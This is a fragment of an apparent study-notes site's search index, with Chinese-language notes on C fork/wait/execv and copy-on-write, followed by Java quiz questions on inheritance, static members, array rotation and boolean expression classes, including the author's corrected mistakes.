\u548c\u7236\u8fdb\u7a0b\u7684\u8fdb\u7a0b ID\u3002</p> <p>\u5728\u7236\u8fdb\u7a0b\u4e2d\uff0cfork() \u8fd4\u56de\u5b50\u8fdb\u7a0b\u7684 PID\uff0c\u56e0\u6b64\u4f1a\u8fdb\u5165 default\u3002\u7236\u8fdb\u7a0b\u4f1a\u7a0d\u5fae\u5ef6\u8fdf\u4e00\u79d2\u949f\uff08sleep(1)\uff09\uff0c\u7136\u540e\u8f93\u51fa\u81ea\u8eab\u548c\u5b50\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002\u9632\u6b62\u7236\u5b50\u540c\u65f6\u8fd0\u884c\u5bfc\u81f4\u4e00\u4e9b\u6df7\u4e71\u60c5\u51b5\u3002</p> <p>\u4e00\u65e6\u7236\u8fdb\u7a0b\u901a\u8fc7 fork() \u521b\u5efa\u4e86\u5b50\u8fdb\u7a0b\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5e76\u6ca1\u6709\u63d0\u4f9b\u4e00\u4e2a\u4e13\u95e8\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u8ba9\u7236\u8fdb\u7a0b\u80fd\u591f\u5728\u4e4b\u540e\u201c\u67e5\u627e\u201d\u6216\u201c\u67e5\u8be2\u201d\u5b50\u8fdb\u7a0b\u7684 PID\uff08\u8fdb\u7a0b ID\uff09\u3002\u5982\u679c\u7236\u8fdb\u7a0b\u4e0d\u4fdd\u5b58\u5b50\u8fdb\u7a0b\u7684 PID\uff0c\u5b83\u5c06\u65e0\u6cd5\u901a\u8fc7\u7279\u5b9a\u7684\u7cfb\u7edf\u8c03\u7528\u6765\u91cd\u65b0\u83b7\u53d6\u5b50\u8fdb\u7a0b\u7684 PID\u3002</p> <p>\u5982\u679c\u7531\u4e8e\u67d0\u4e9b\u539f\u56e0\uff0c\u7236\u8fdb\u7a0b\u4e22\u5931\u4e86\u5b50\u8fdb\u7a0b\u7684 PID\uff08\u4f8b\u5982\u6ca1\u6709\u5b58\u50a8 PID\uff09\uff0c\u6ca1\u6709\u7279\u5b9a\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u6bd4\u5982 get_child_pid()\uff0c\u53ef\u4ee5\u8ba9\u7236\u8fdb\u7a0b\u7a0d\u540e\u83b7\u53d6\u5b83\u7684\u5b50\u8fdb\u7a0b\u7684 PID\u3002\u4e00\u65e6\u7236\u8fdb\u7a0b\u901a\u8fc7 fork() \u5f97\u5230\u5b50\u8fdb\u7a0b\u7684 PID\uff0c\u5c31\u9700\u8981\u7236\u8fdb\u7a0b\u81ea\u5df1\u8d1f\u8d23\u8ddf\u8e2a\u8fd9\u4e2a PID\u3002</p> <p>\u7236\u8fdb\u7a0b\u5728 fork() \u4e4b\u540e\u5982\u4f55\u4e0e\u5b50\u8fdb\u7a0b\u4ea4\u4e92\uff1f</p> <ul> <li>wait() \u548c waitpid()\uff1a\u8fd9\u4e9b\u7cfb\u7edf\u8c03\u7528\u5141\u8bb8\u7236\u8fdb\u7a0b\u7b49\u5f85\u5176\u5b50\u8fdb\u7a0b\u7ed3\u675f\uff0c\u5e76\u5728\u5b50\u8fdb\u7a0b\u7ec8\u6b62\u65f6\u8fd4\u56de\u5b50\u8fdb\u7a0b\u7684 PID\u3002</li> </ul> <p>child \u4e5f\u53ef\u4ee5 call fork</p>"},{"location":"cs/c/5.2/#shell","title":"Shell","text":"<p>shell \u4f1a\u7b49\u5f85\u5176\u4e2d\u6240\u6709\u5b50\u8fdb\u7a0b\u7cfb\u7edf\u540a\u5f71\u7684\u5b8c\u6210\u518d\u6267\u884c\u4e0b\u4e00\u6b65\uff0c\u4ee5\u4e0b\u7a0b\u5e8f\u4eff\u771f\u4e86\u8fd9\u4e00\u70b9</p> <pre><code>#include  &lt;stdio.h&gt;\n#include  &lt;stdlib.h&gt;\n#include  &lt;unistd.h&gt;\n#include  &lt;sys/wait.h&gt;\n\nvoid function(void)\n{\n    switch ( fork() ) {\n    case -1 :\n        printf(\"fork() failed\\n\"); // process creation failed\n        exit(EXIT_FAILURE);\n        break;\n\n    case 0:                       // new child process\n        printf(\"child is pid=%i\\n\", getpid() );\n\n        for(int t=0 ; t&lt;3 ; ++t) {\n            printf(\"  tick\\n\");\n            sleep(1);\n        }\n        exit(EXIT_SUCCESS);\n        break;\n\n    default: {                    // original parent process\n        int child, status;\n\n        printf(\"parent waiting\\n\");\n        child = wait( &amp;status );\n\n        printf(\"process pid=%i terminated with exit status=%i\\n\",\n                child, WEXITSTATUS(status) );\n        exit(EXIT_SUCCESS);\n        break;\n    }\n\n    }\n}\n</code></pre>"},{"location":"cs/c/5.2/#_2","title":"\u7236\u5b50\u8fdb\u7a0b\u5185\u5b58","text":"<p>\u5f53 fork() \u521b\u5efa\u5b50\u8fdb\u7a0b\u65f6\uff0c\u5b50\u8fdb\u7a0b\u83b7\u5f97\u4e86\u7236\u8fdb\u7a0b\u5185\u5b58\u7684\u526f\u672c\uff0c\u5305\u62ec\u7a0b\u5e8f\u4e2d\u7684\u53d8\u91cf\u3001\u6808\uff08stack\uff09\u3001\u5806\uff08heap\uff09\u3002\u7236\u8fdb\u7a0b\u4f7f\u7528\u5b83\u539f\u6709\u7684\u5185\u5b58\uff0c\u800c\u5b50\u8fdb\u7a0b\u4f1a\u4f7f\u7528\u81ea\u5df1\u62f7\u8d1d\u5230\u7684\u5185\u5b58\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5b50\u8fdb\u7a0b\u5728\u5f00\u59cb\u65f6\u6709\u4e00\u4efd\u4e0e\u7236\u8fdb\u7a0b\u76f8\u540c\u7684\u5185\u5b58\u526f\u672c\u3002</p> <p>\u4f20\u7edf\u89c2\u5ff5\u662f\u7236\u8fdb\u7a0b\u8c03\u7528 fork() \u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u4e3a\u5b50\u8fdb\u7a0b\u521b\u5efa\u4e00\u4efd\u7236\u8fdb\u7a0b\u5185\u5b58\u7684\u5b8c\u6574\u526f\u672c\u3002\u7136\u800c\uff0c\u8fd9\u6837\u505a\u6548\u7387\u975e\u5e38\u4f4e\uff0c\u56e0\u4e3a\u5927\u90e8\u5206\u65f6\u5019\uff0c\u5b50\u8fdb\u7a0b\u53ef\u80fd\u5e76\u4e0d\u4f1a\u5bf9\u5927\u90e8\u5206\u5185\u5b58\u8fdb\u884c\u4fee\u6539\u3002</p> <p>\u4e3a\u4e86\u4f18\u5316\uff0c\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u5f15\u5165\u4e86 \u5199\u65f6\u590d\u5236 (Copy-on-Write, COW) \u7684\u673a\u5236\u3002\u8fd9\u79cd\u673a\u5236\u4e0b\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4e0d\u4f1a\u7acb\u5373\u4e3a\u5b50\u8fdb\u7a0b\u590d\u5236\u7236\u8fdb\u7a0b\u7684\u6240\u6709\u5185\u5b58\uff0c\u53ea\u6709\u5728\u771f\u6b63\u9700\u8981\u7684\u65f6\u5019\u624d\u4f1a\u6267\u884c\u590d\u5236\u3002\u5b83\u7684\u5de5\u4f5c\u65b9\u5f0f\u5982\u4e0b\uff1a</p> <p>\u5199\u65f6\u590d\u5236\u7684\u673a\u5236\u4f18\u5316\u4e86\u5185\u5b58\u7ba1\u7406\uff1a\u7236\u5b50\u8fdb\u7a0b\u53ea\u5728\u9700\u8981\u4fee\u6539\u6570\u636e\u65f6\uff0c\u624d\u4f1a\u771f\u6b63\u590d\u5236\u5185\u5b58\u3002\u8fd9\u51cf\u5c11\u4e86\u5185\u5b58\u5360\u7528\uff0c\u63d0\u5347\u4e86\u6548\u7387\u3002</p>"},{"location":"cs/c/5.2/#shell_1","title":"shell \u52a0\u901f","text":"<p>\u5728 Unix/Linux \u4e2d\uff0c\u7236\u8fdb\u7a0b\u4f7f\u7528 fork() \u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u5b50\u8fdb\u7a0b\u540e\uff0c\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u9ed8\u8ba4\u8fd0\u884c\u76f8\u540c\u7684\u4ee3\u7801\u3002\u4f46\u5b9e\u9645\u9700\u6c42\u4e2d\uff0c\u6211\u4eec\u5e0c\u671b\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u6267\u884c\u4e0d\u540c\u7684\u7a0b\u5e8f\uff0c\u56e0\u6b64\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u8ba9\u5b50\u8fdb\u7a0b\u52a0\u8f7d\u5e76\u8fd0\u884c\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\uff0c\u800c\u4e0d\u662f\u7ee7\u7eed\u8fd0\u884c\u7236\u8fdb\u7a0b\u7684\u4ee3\u7801\u3002\u8fd9\u4e2a\u65f6\u5019\uff0cexecv() \u7cfb\u7edf\u8c03\u7528\u5c31\u6d3e\u4e0a\u7528\u573a\u4e86\u3002</p> <p>\u5728 Unix/Linux \u4e2d\uff0c\u7236\u8fdb\u7a0b\u4f7f\u7528 fork() \u521b\u5efa\u4e86\u4e00\u4e2a\u65b0\u7684\u5b50\u8fdb\u7a0b\u540e\uff0c\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u9ed8\u8ba4\u8fd0\u884c\u76f8\u540c\u7684\u4ee3\u7801\u3002\u4f46\u5b9e\u9645\u9700\u6c42\u4e2d\uff0c\u6211\u4eec\u5e0c\u671b\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u6267\u884c\u4e0d\u540c\u7684\u7a0b\u5e8f\uff0c\u56e0\u6b64\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u8ba9\u5b50\u8fdb\u7a0b\u52a0\u8f7d\u5e76\u8fd0\u884c\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\uff0c\u800c\u4e0d\u662f\u7ee7\u7eed\u8fd0\u884c\u7236\u8fdb\u7a0b\u7684\u4ee3\u7801\u3002\u8fd9\u4e2a\u65f6\u5019\uff0cexecv() \u7cfb\u7edf\u8c03\u7528\u5c31\u6d3e\u4e0a\u7528\u573a\u4e86\u3002</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nchar *program_arguments[] = {\n    \"ls\",       // \u6267\u884c\u7684\u7a0b\u5e8f\u540d\n    \"-l\",       // \u53c2\u65701\uff1a\u5217\u51fa\u6587\u4ef6\u8be6\u7ec6\u4fe1\u606f\n    \"-F\",       // \u53c2\u65702\uff1a\u9644\u52a0\u6587\u4ef6\u7c7b\u578b\n    NULL        // \u53c2\u6570\u5fc5\u987b\u4ee5 NULL \u7ed3\u675f\n};\n\nint main() {\n    execv(\"/bin/ls\", program_arguments);  // \u8c03\u7528 execv() \u8fd0\u884c ls \u547d\u4ee4\n\n    // \u5982\u679c execv \u6210\u529f\u8fd0\u884c\uff0c\u4e0b\u9762\u8fd9\u884c\u4ee3\u7801\u4e0d\u4f1a\u88ab\u6267\u884c\n    perror(\"execv failed\");               // \u5982\u679c execv \u5931\u8d25\uff0c\u6253\u5370\u9519\u8bef\u4fe1\u606f\n    exit(EXIT_FAILURE);\n}\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5b50\u8fdb\u7a0b\u4f1a\u8fd0\u884c execv()\uff0c\u7528\u65b0\u7684\u7a0b\u5e8f /bin/ls \u66ff\u6362\u5b83\u7684\u5185\u5b58\u3002\u8fd9\u610f\u5473\u7740\u5b83\u5c06\u6267\u884c ls -l -F \u547d\u4ee4\u3002\u6210\u529f\u540e\uff0c\u5f53\u524d\u8fdb\u7a0b\u7684\u4ee3\u7801\u5c31\u5b8c\u5168\u88ab\u65b0\u7684 ls \u7a0b\u5e8f\u4ee3\u7801\u66ff\u4ee3\u3002</p> <p>\u5728\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u7684\u534f\u4f5c\u4e2d\uff0c\u901a\u5e38\u7684\u505a\u6cd5\u662f\uff1a</p> <p>\u7236\u8fdb\u7a0b\u7ee7\u7eed\u6267\u884c\u5b83\u81ea\u5df1\u7684\u4efb\u52a1\u3002</p> <p>\u5b50\u8fdb\u7a0b\u4f7f\u7528 execv() \u6216\u5176\u4ed6\u7c7b\u4f3c\u7684 exec \u7cfb\u5217\u51fd\u6570\u6765\u8fd0\u884c\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\u3002</p> <p>\u7236\u8fdb\u7a0b\u53ef\u4ee5\u901a\u8fc7 wait() \u7b49\u65b9\u5f0f\u7b49\u5f85\u5b50\u8fdb\u7a0b\u5b8c\u6210\u3002</p>"},{"location":"cs/c/5.2/#conclusion","title":"Conclusion","text":"<p>\u76ee\u7684\uff1afork() \u521b\u5efa\u4e86\u5b50\u8fdb\u7a0b\u540e\uff0cexecv() \u8ba9\u5b50\u8fdb\u7a0b\u53ef\u4ee5\u8fd0\u884c\u4e00\u4e2a\u5168\u65b0\u7684\u7a0b\u5e8f\u3002 \u884c\u4e3a\uff1a\u5b50\u8fdb\u7a0b\u7684\u5185\u5b58\u4f1a\u88ab\u65b0\u7a0b\u5e8f\u66ff\u4ee3\uff0c\u56e0\u6b64\u5b83\u53d8\u6210\u4e86\u4e00\u4e2a\u5168\u65b0\u7684\u7a0b\u5e8f\u3002 \u91cd\u8981\u6027\uff1a\u5728\u591a\u4efb\u52a1\u7cfb\u7edf\u4e2d\uff0c\u7236\u8fdb\u7a0b\u548c\u5b50\u8fdb\u7a0b\u901a\u5e38\u4e0d\u4f1a\u505a\u540c\u6837\u7684\u4e8b\u60c5\uff0c\u6240\u4ee5\u9700\u8981 execv() \u8fd9\u6837\u7684\u673a\u5236\u6765\u8fd0\u884c\u4e0d\u540c\u7684\u7a0b\u5e8f\u3002</p> <p>\u4ee5\u53ca shell \u914d\u5408 c \u8bed\u8a00\u4e00\u8d77\u8fd0\u884c\u7684\u65f6\u5019\u53c2\u6570\u4e00\u8d77\u5de5\u4f5c\u7684\u65b9\u5f0f\u5f88\u91cd\u8981</p> <p>./status 0 &amp;&amp; ./status 1</p> <p>./status 1 &amp;&amp; ./status 0</p> <p>./status 0 || ./status 1</p> <p>./status 1 || ./status 0</p> <ul> <li><code>&amp;&amp;</code> \u8fd0\u7b97\u7b26\u5728\u524d\u4e00\u4e2a\u547d\u4ee4\u6210\u529f\u65f6\u6267\u884c\u540e\u4e00\u4e2a\u547d\u4ee4\u3002</li> <li><code>||</code> \u8fd0\u7b97\u7b26\u5728\u524d\u4e00\u4e2a\u547d\u4ee4\u5931\u8d25\u65f6\u6267\u884c\u540e\u4e00\u4e2a\u547d\u4ee4\u3002</li> <li>\u9000\u51fa\u72b6\u6001\u7801 <code>0</code> \u901a\u5e38\u8868\u793a\u6210\u529f\uff0c\u975e <code>0</code> \u8868\u793a\u5931\u8d25\u3002</li> </ul>"},{"location":"cs/java/basics/t1/","title":"1.0 T1","text":""},{"location":"cs/java/basics/t1/#q9","title":"Q9","text":"<p>What does the following program print?</p> <pre><code>class Person {\n    public String status() { return \"Okay\"; }\n}\n\nclass Student extends Person {\n    public String status() { return \"Stressed\"; }\n}\n\nclass Academic extends Person {\n    public String status() { return \"Busy\"; }\n}\n\nclass Lecturer extends Academic { }\n\npublic class People {\n    public static void main(String[] args) {    \n        Person[] people = {new Person(), new Student(), new Academic(), new Lecturer()};\n        for (int i = 0; i &lt; people.length; i++) {\n            Person person = people[i];\n            System.out.print(person.status() + \" \");\n        }\n    }\n}\n</code></pre> <p>\u8fd9\u9053\u9898\u6b7b\u7684\u5f88\u51a4\u6789\uff0c\u662f\u5403\u4e86\u6ca1\u6709\u68c0\u67e5\u7684\u4e8f\uff0c\u518d\u770b\u4e00\u904d\u5b9e\u9645\u4e0a\u5c31\u662f Okay Stressed Busy Busy, \u6700\u540e\u4e00\u4e2a\u7c7b\u5176\u7ee7\u627f\u7684\u5b9e\u9645\u4e0a\u662f Academic</p>"},{"location":"cs/java/basics/t1/#q10","title":"Q10","text":"<p>Which of the following would be reasonable as an example of a subclass relationship?</p> <p>There may be multiple correct answers. Select all of them.</p> <p>Potato is a subclass of Vegetable</p> <p>Building is a subclass of Skyscraper</p> <p>House is a subclass of Building</p> <p>Potato is a subclass of Building</p> <p>Window is a subclass of House</p> <p>\u8fd9\u9053\u9898\u6211\u9009\u62e9\u4e86\u4ee5\u4e0a\u4e09\u4e2a\uff0c\u9519\u70b9\u5728\u4e8e\u6ca1\u6709\u641e\u6e05\u695a Class \u4e4b\u95f4\u7684\u5173\u7cfb\u3002\u8bc4\u8bba\u5199\u9053\uff1a</p> <p>\u8bb0\u4f4f\uff0c\u201cX \u662f Y \u7684\u5b50\u7c7b\u201d \u610f\u5473\u7740 \u201cX \u662f Y\u201d</p> <p>Window \u53ea\u662f House \u5176\u4e2d\u7684\u4e00\u4e2a\u90e8\u5206\uff0c\u672c\u8eab\u5b9e\u9645\u4e0a\u5e76\u4e0d\u662f\u4e00\u4e2a\u7c7b / \u623f\u5b50</p>"},{"location":"cs/java/basics/t1/#q11","title":"Q11","text":"<pre><code>public class Counter {\n    private int count;\n\n    public int getCount() { return count; }\n\n    public void increment() { count += 1; }\n\n    public void decrement() { count -= 1; }\n\n    public static void main(String[] args) {\n        Counter.increment();\n        decrement();\n        increment();\n        System.out.println(Counter.getCount());\n    }\n}\n</code></pre> <p>Which members of the <code>Counter</code> class need to be made <code>static</code> in order for the code to compile successfully?</p> <p>There may be multiple correct answers. Select all of them</p> <p>\u9759\u6001\u6210\u5458 (\u7528 <code>static</code> \u4fee\u9970\u7684\u53d8\u91cf\u6216\u65b9\u6cd5): \u5b83\u4eec\u5c5e\u4e8e\u7c7b\u672c\u8eab\uff0c\u800c\u4e0d\u662f\u5c5e\u4e8e\u7c7b\u7684\u67d0\u4e2a\u7279\u5b9a\u7684\u5bf9\u8c61 (\u5b9e\u4f8b)\u3002\u65e0\u8bba\u521b\u5efa\u591a\u5c11\u4e2a\u7c7b\u7684\u5bf9\u8c61\uff0c\u9759\u6001\u6210\u5458\u53ea\u6709\u4e00\u4efd\uff0c\u88ab\u6240\u6709\u5bf9\u8c61\u5171\u4eab\u3002\u9759\u6001\u65b9\u6cd5\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u7c7b\u540d\u8c03\u7528 (<code>ClassName.staticMethod()</code>)\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5bf9\u8c61\u8c03\u7528 (<code>object.staticMethod()</code>)\uff0c\u4f46\u901a\u5e38\u63a8\u8350\u4f7f\u7528\u7c7b\u540d\u8c03\u7528\u3002</p> <p>\u975e\u9759\u6001\u6210\u5458 (\u6ca1\u6709\u7528 <code>static</code> \u4fee\u9970\u7684\u53d8\u91cf\u6216\u65b9\u6cd5): \u5b83\u4eec\u5c5e\u4e8e\u7c7b\u7684\u5bf9\u8c61 (\u5b9e\u4f8b)\u3002\u6bcf\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u5c31\u6709\u4e00\u4efd\u81ea\u5df1\u7684\u975e\u9759\u6001\u6210\u5458\u53d8\u91cf\u548c\u975e\u9759\u6001\u65b9\u6cd5\u3002\u4f60\u9700\u8981\u5148\u521b\u5efa\u7c7b\u7684\u5bf9\u8c61\uff0c\u7136\u540e\u901a\u8fc7\u5bf9\u8c61\u6765\u8c03\u7528\u8fd9\u4e9b\u65b9\u6cd5 (<code>object.instanceMethod()</code>) \u6216\u8bbf\u95ee\u53d8\u91cf (<code>object.instanceVariable</code>)\u3002</p> <p>Java \u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u662f <code>public static void main(String[] args)</code>\u3002<code>main</code> \u65b9\u6cd5\u5fc5\u987b\u662f <code>static</code> \u7684\uff0c\u56e0\u4e3a Java \u865a\u62df\u673a (JVM) \u5728\u542f\u52a8\u7a0b\u5e8f\u65f6\uff0c\u4e0d\u9700\u8981\u521b\u5efa\u7c7b\u7684\u5bf9\u8c61\u5c31\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 <code>main</code> \u65b9\u6cd5\u6765\u6267\u884c\u7a0b\u5e8f\u3002</p> <p>\u9759\u6001\u65b9\u6cd5 (<code>main</code>) \u5728\u6267\u884c\u65f6\uff0c\u6ca1\u6709\u4e00\u4e2a\u7279\u5b9a\u7684 <code>Counter</code> \u5bf9\u8c61\u4e0e\u4e4b\u5173\u8054\uff08\u6ca1\u6709 <code>this</code> \u6307\u9488\u6307\u5411\u4e00\u4e2a\u5bf9\u8c61\uff09\u3002\u5b83\u4e0d\u77e5\u9053\u5e94\u8be5\u5bf9\u54ea\u4e2a <code>Counter</code> \u5bf9\u8c61\u7684 <code>count</code> \u8fdb\u884c\u64cd\u4f5c\u6216\u83b7\u53d6\u3002</p> <p>\u6240\u4ee5\u9700\u8981\u628a\u6240\u6709\u7684 function \u4ee5\u53ca\u53d8\u91cf\u5168\u90e8\u90fd\u9759\u6001\u5316</p> <pre><code>public class Counter {\n    private static int count; // \u4f7f count \u6210\u4e3a\u9759\u6001\u53d8\u91cf\n\n    public static int getCount() { return count; } // \u4f7f\u65b9\u6cd5\u6210\u4e3a\u9759\u6001\u7684\n\n    public static void increment() { count += 1; } // \u4f7f\u65b9\u6cd5\u6210\u4e3a\u9759\u6001\u7684\n\n    public static void decrement() { count -= 1; } // \u4f7f\u65b9\u6cd5\u6210\u4e3a\u9759\u6001\u7684\n\n    public static void main(String[] args) {\n        // \u73b0\u5728\u53ef\u4ee5\u5728\u9759\u6001\u7684 main \u65b9\u6cd5\u4e2d\u76f4\u63a5\u8c03\u7528\u9759\u6001\u65b9\u6cd5\u4e86\n        Counter.increment();\n        decrement();\n        increment();\n        System.out.println(Counter.getCount());\n    }\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u5728\u7b2c 12 \u884c\u6307\u5b9a\u76f4\u63a5\u7528 class \u6784\u9020\u51fd\u6570\u8c03\u7528\u540e\u540e\u7eed\u9ed8\u8ba4\u4f7f\u7528\u8be5\u65b9\u6cd5\u4f46\u4e0d\u89c4\u8303</p> <p>count</p> <p>getCount()</p> <p>increment()</p> <p>decrement()</p>"},{"location":"cs/java/basics/t1/#q12","title":"Q12","text":"<pre><code>static void rotate(int[] arr) {\n    // Your code here\n}\n\nstatic int[] rotated(int[] arr) {\n    // Your code here\n}\n</code></pre> <p>Both of these methods should rotate the elements in the given array one space to the left (with the first element wrapping around to the end of the array). However, <code>rotate(x)</code> should rotate the elements in place within <code>x</code>, while <code>rotated(x)</code> should return a rotated version of <code>x</code> without modifying the contents of <code>x</code> itself.</p> <p>For Example:</p> <pre><code>int[] x = {2, 0, 0, 5};\nrotate(x);\n// x should at this point contain {0, 0, 5, 2}\n</code></pre> <p>You may assume for both methods that the given array is non-empty.</p>"},{"location":"cs/java/basics/t1/#rotate","title":"rotate","text":"<pre><code>static void rotate(int[] arr) {\n    last_num = arr.length - 1;\n    arr[last_num] = arr[0];\n    for (int i = 0; i &lt; arr.length - 1, i++){\n        arr[i] = arr[i + 1];\n    }\n}\n</code></pre> <p>\u6700\u540e\u4e00\u4f4d\u53d8\u6210\u7b2c\u4e00\u4f4d\uff0c\u6240\u6709\u5176\u4f59\u6570\u503c\u5168\u90e8\u5f80\u5de6\u8fb9\u79fb\u52a8\u4e00\u4f4d\u3002</p> <p>\u8be5\u65b9\u6cd5\u76ee\u6807\u662f\u76f4\u63a5\u65cb\u8f6c\u539f\u59cb\u6570\u7ec4\uff0c\u4f46\u662f\u903b\u8f91\u9519\u8bef\u5982\u4e0b\uff1a</p> <ol> <li>\u7b2c\u4e8c\u884c\u6ca1\u6709\u58f0\u660e <code>int</code> \u7c7b\u578b</li> <li>\u7b2c\u4e09\u884c\u628a\u7b2c\u4e00\u4e2a\u6570\u7ec4\u4e2d\u7684\u6570\u5b57\u653e\u5728\u6700\u540e\u7684\u6570\u7ec4\u4f4d\u7f6e\u4e0a<ol> <li>\u8fd9\u6837\u505a\u4f1a\u76f4\u63a5\u8986\u76d6\u6389\u6700\u540e\u4e00\u4e2a\u4f4d\u7f6e\u4e0a\u539f\u672c\u7684\u6570\u503c\u4e22\u5931\u4e86</li> <li>\u56e0\u6b64\u6b63\u786e\u601d\u8def\u662f\u5728\u8986\u76d6\u6389\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u4e4b\u524d\u5c31\u8981\u628a\u539f\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u4e34\u65f6\u4fdd\u5b58</li> </ol> </li> </ol> <p>\u6240\u4ee5\u9996\u5148\u6539\u6b63\u8bed\u6cd5\u9519\u8bef\u7136\u540e\u6539\u6b63\u7b97\u6cd5</p> <pre><code>public class Main {\n    static void rotate(int[] arr) {\n        // int first = arr[0];\n        // int last = arr[arr.length - 1];\n\n        for (int i = 0; i &lt; arr.length - 1; i++) {\n            arr[i] = arr[i + 1];\n        }\n    }\n\n    public static void main(String[] args) {\n        int[] arr = { 1, 2, 3, 4, 5 };\n        rotate(arr);\n        for (int i : arr) {\n            System.out.println(i);\n        }\n    }\n\n}\n</code></pre> <p>\u73b0\u5728\u7b97\u6cd5\u8fd8\u662f\u6709\u5c0f\u95ee\u9898\uff0c\u6d4b\u8bd5\u53d1\u73b0\u6838\u5fc3\u7b97\u6cd5\u601d\u8def\u6ca1\u95ee\u9898\uff0c\u8f93\u51fa\u4e3a</p> <pre><code>2\n3\n4\n5\n5\n</code></pre> <p>\u8fd9\u6837\u4ee5\u6765\u5c31\u597d\u529e\u4e86\uff0c\u5728\u5f00\u59cb\u4e4b\u524d\u8bb0\u4f4f\u7b2c\u4e00\u4e2a\u5185\u5bb9\u540e\u5728\u6392\u5e8f\u7ed3\u675f\u540e\u66ff\u6362\u5230\u672b\u5c3e\u5373\u53ef</p> <pre><code>public class Main {\n    static void rotate(int[] arr) {\n        int first = arr[0];\n\n        for (int i = 0; i &lt; arr.length - 1; i++) {\n            arr[i] = arr[i + 1];\n        }\n        arr[arr.length - 1] = first;\n    }\n\n    public static void main(String[] args) {\n        int[] arr = { 1, 2, 3, 4, 5 };\n        rotate(arr);\n        for (int i : arr) {\n            System.out.println(i);\n        }\n    }\n\n}\n</code></pre> <p>\u5b8c\u7f8e\u89e3\u51b3\uff0c<code>23451</code></p>"},{"location":"cs/java/basics/t1/#rotated","title":"rotated","text":"<pre><code>int[] y = rotated(x);\n// x should still be {0, 0, 5, 2}, but\n// y should now be {0, 5, 2, 0}\n</code></pre> <pre><code>static int[] rotated(int[] arr) {\n    int[] result = new int[arr.length];\n    last_num = arr.length - 1;\n    result[last_num] = arr[0];\n    for (int i = 1; i &lt; arr.length, i++){\n        int j = 0;\n        result[j] = arr[i];\n        j++;\n    }\n    return result;\n}\n</code></pre> <p>\u7ed3\u679c\u5c31\u662f\u4ec0\u4e48\u4e5f\u6ca1\u53d8</p> <p></p> <p>\u7531\u4e8e\u591a\u51fa\u6765\u4e00\u7ec4\u6570\u7ec4\uff0c\u53ef\u4ee5\u76f4\u63a5\u7a0d\u5fae\u4fee\u6539\u4e0b rotate \u51fd\u6570\u5373\u53ef</p> <pre><code>public class Main {\n    static int[] rotated(int[] arr) {\n        int first = arr[0];\n        int[] result = new int[arr.length];\n\n        for (int i = 0; i &lt; arr.length - 1; i++) {\n            result[i] = arr[i + 1];\n        }\n        result[arr.length - 1] = first;\n        return result;\n    }\n\n    public static void main(String[] args) {\n        int[] arr = { 1, 2, 3, 4, 5 };\n        int[] result = rotated(arr);\n        for (int i : result) {\n            System.out.println(i);\n        }\n    }\n}\n</code></pre> <p><code>rotated</code>\u65b9\u6cd5\u4e5f\u662f\u9759\u6001\u7684\uff0c\u8fd9\u4f7f\u5f97\u5b83\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4ece<code>main</code>\u65b9\u6cd5\u4e2d\u8c03\u7528</p>"},{"location":"cs/java/basics/t1/#q13","title":"Q13","text":"<pre><code>class BoolExpr {\n    public void describe() {\n        System.out.print(\"unknown\");\n    } // To be overridden\n\n    public boolean evaluate() {\n        return false;\n    } // To be overridden\n}\n\nclass BoolVal extends BoolExpr {\n    boolean val;\n\n    public BoolVal(boolean val) {\n        this.val = val; // this \u5199\u6cd5\u662f\u4e3a\u4e86\u8c03\u7528\u5b89\u5168\u8d77\u89c1\n    }\n\n    @Override\n    public void describe() {\n        System.out.print(val);\n    }\n\n    @Override\n    public boolean evaluate() {\n        return val;\n    }\n}\n</code></pre> <p>Write two new classes</p> <p><code>BoolNot</code> must have a constructor that is able to take any single BoolExpr, and represents the negation of that expression: <code>!expr</code></p> <p><code>BoolAnd</code> must have a constructor that is able to take any pair of BoolExprs, and represents the logical and of those expressions: <code>(lhs &amp;&amp; rhs)</code></p> <pre><code>BoolExpr expr = new BoolAnd(new BoolVal(true), new BoolVal(false));\n// \u8fd9\u91cc\u4f7f\u7528\u4e24\u4e2a BoolVal \u7684\u53c2\u6570\u4f20\u53c2\u7ed9 BoolAnd\nexpr = new BoolNot(expr); // \u518d\u4f20\u7ed9 BoolNot \u8fdb\u884c ! \u64cd\u4f5c\nexpr = new BoolAnd(new BoolVal(true), expr); // true \u4e0e\u4e0a\u4e00\u4e2a expr \u8fdb\u884c &amp;&amp; \u64cd\u4f5c\nexpr.describe(); // \u63cf\u8ff0\u4e00\u4e0b\u73b0\u5728\u8fd9\u4e2a expr \u662f\u5565\u6837\u7684\nSystem.out.println(); // \u6362\u884c\nSystem.out.println(\"= \" + expr.evaluate()); // \u8ba1\u7b97\u6700\u7ec8\u7ed3\u679c\n</code></pre> 